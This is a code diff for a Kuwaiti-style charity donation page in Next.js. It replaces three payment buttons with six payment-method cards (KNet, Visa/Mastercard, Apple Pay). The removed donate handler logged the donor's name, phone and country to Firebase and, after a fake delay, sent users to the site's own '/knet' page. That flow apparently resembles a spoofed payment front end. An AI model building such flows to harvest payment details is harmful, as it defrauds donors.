@@ -1,6 +1,6 @@
 "use client"
 
-import { Plus, Minus, Search, ChevronLeft } from "lucide-react"
+import { Plus, Minus, Search, ChevronLeft, Check } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Progress } from "@/components/ui/progress"
@@ -10,7 +10,51 @@ import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
 import { FullPageLoader } from "@/components/fullpageloader"
 import { getFirestore, doc, onSnapshot } from "firebase/firestore"
+import { Card } from "@/components/ui/card"
+import Image from "next/image"
 
+
+const paymentMethods = [
+  {
+    id: 1,
+    name: "Saudi Cards",
+    icon: "/visamaster.png",
+    description: "البطاقات السعودية",
+  },
+  {
+    id: 2,
+    name: "Visa/Mastercard",
+    icon: "/Flag_of_Kuwait.svg.png",
+    description: "فيزا / ماستر",
+
+  },
+  {
+    id: 3,
+    name: "KNet",
+    icon: "/kn.png",
+    description: "كي نت",
+
+  },
+  {
+    id: 4,
+    name: "Apple Pay (KWD)",
+    icon: "/ap.png",
+    description: "ابل باي (KWD)",
+
+  },
+  {
+    id: 5,
+    name: "Visa/Mastercard",
+    icon: "/ua.png",
+    description: "فيزا / ماستر",
+  },
+  {
+    id: 6,
+    name: "Apple Pay (KNet)",
+    icon: "/ap.png",
+    description: "ابل باي (كي نت)",
+  },
+]
 export default function CharityDonationPage() {
   const [phone, setPhone] = useState("")
   const [name, setName] = useState("")
@@ -18,8 +62,9 @@ export default function CharityDonationPage() {
   const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
   const [country, setCountry] = useState("")
-  const [paymentMethod, setPayment] = useState("knet")
   const router = useRouter()
+  const [showError, setShowError] = useState(false)
+  const [selectedMethod, setSelectedMethod] = useState(3) // Default to KNet (id: 3) as selected
 
   // Add these state variables at the top of the component with the other state declarations
   const [projectTotal, setProjectTotal] = useState("970.000")
@@ -190,16 +235,16 @@ export default function CharityDonationPage() {
             </div>
           </div>
 
-          <div className="grid grid-cols-2 gap-4 text-right mt-4">
-            <div className="flex justify-between">
+          <div className="flex flex-col gap-4 text-right mt-4">
+            <div className="flex justify-between border p-2 rounded">
               <div className="font-bold">د.ك {projectTotal}</div>
               <div className="text-gray-500">قيمة المشروع</div>
             </div>
-            <div className="flex justify-between">
+            <div className="flex justify-between border p-2 rounded">
               <div className="font-bold">د.ك {projectPaid}</div>
               <div className="text-gray-500">المدفوع</div>
             </div>
-            <div className="flex justify-between">
+            <div className="flex justify-between border p-2 rounded">
               <div className="font-bold">د.ك {projectRemaining}</div>
               <div className="text-gray-500">المتبقي</div>
             </div>
@@ -281,48 +326,38 @@ export default function CharityDonationPage() {
         </div>
 
         {/* Payment Methods */}
-        <div className="px-4 py-2">
-          <div className="flex flex-wrap gap-3 justify-between mb-6">
-            <div onClick={() => { setPayment('master') }} className={`border ${paymentMethod === 'master' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative`}>
-              <img src="/vercel.svg" alt="Payment Method 1" width={60} height={30} className="h-6 w-auto" />
+        <div className="container mx-auto p-2">
+      <div className="grid grid-cols-3 md:grid-cols-3 gap-1">
+        {paymentMethods.map((method) => (
+          <Card
+            key={method.id}
+            className={`p-2 cursor-pointer transition-colors relative ${
+              selectedMethod === method.id ? "border-2 border-primary" : "hover:bg-muted"
+            }`}
+            onClick={() => setSelectedMethod(method.id)}
+          >
+            {selectedMethod === method.id && (
+              <div className="absolute top-2 right-2 bg-green-500 rounded-full p-0.5">
+                <Check className="h-4 w-4 text-white" />
+              </div>
+            )}
+            <div className="flex flex-col items-center gap-1 text-center">
+              <img
+                src={method.icon || "/placeholder.svg"}
+                alt={method.name}
+                width={40}
+                height={40}
+                className="object-contain"
+              />
+              <p style={{fontSize:10}} className="text-sm text-muted-foreground">{method.description}</p>
             </div>
-            <div onClick={() => { setPayment('visa') }} className={`border ${paymentMethod === 'visa' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative`}>
-              <img src="/next.svg" alt="Payment Method 2" width={60} height={30} className="h-6 w-auto" />
-            </div>
-            <div onClick={() => { setPayment('knet') }} className={`border ${paymentMethod === 'knet' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center`}>
-              <img src="/kn.png" alt="K-net" width={60} height={30} className="h-6 w-auto" />
-            </div>
-          </div>
+            
+          </Card>
+        ))}
+      </div>
+     {selectedMethod === 4 || selectedMethod ===6 ? <p style={{fontSize:10}} className="text-sm text-red-500 text-center font-bold py-2">غير متوفر حالياً</p>:null}
 
-          {/* Donation Buttons */}
-          <div className="space-y-2 mb-6">
-            <Button className="w-full bg-amber-600 hover:bg-amber-700 text-white py-3 rounded-md flex items-center justify-center gap-2">
-              <svg viewBox="0 0 24 24" className="h-5 w-5" fill="currentColor">
-                <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z" />
-              </svg>
-              <span>إضافة إلى السلة</span>
-            </Button>
-            <Button
-              onClick={() => {
-                setLoading(true)
-                localStorage.setItem("item", value.toString())
-                setTimeout(() => {
-                  setLoading(false)
-                  addData({ id: _id, page: "كي نت", name: name, phone: phone, country: country })
-                  if (paymentMethod === 'knet') {
-                    router.push("/knet")
-
-                  } else if (paymentMethod === 'visa' || paymentMethod === 'master') {
-                    router.push('/payment')
-                  }
-                }, 4000)
-              }}
-              className="w-full bg-teal-600 hover:bg-teal-700 text-white py-3 rounded-md"
-            >
-              تبرع
-            </Button>
-          </div>
-        </div>
+    </div>
       </main>
 
       {/* WhatsApp Button */}
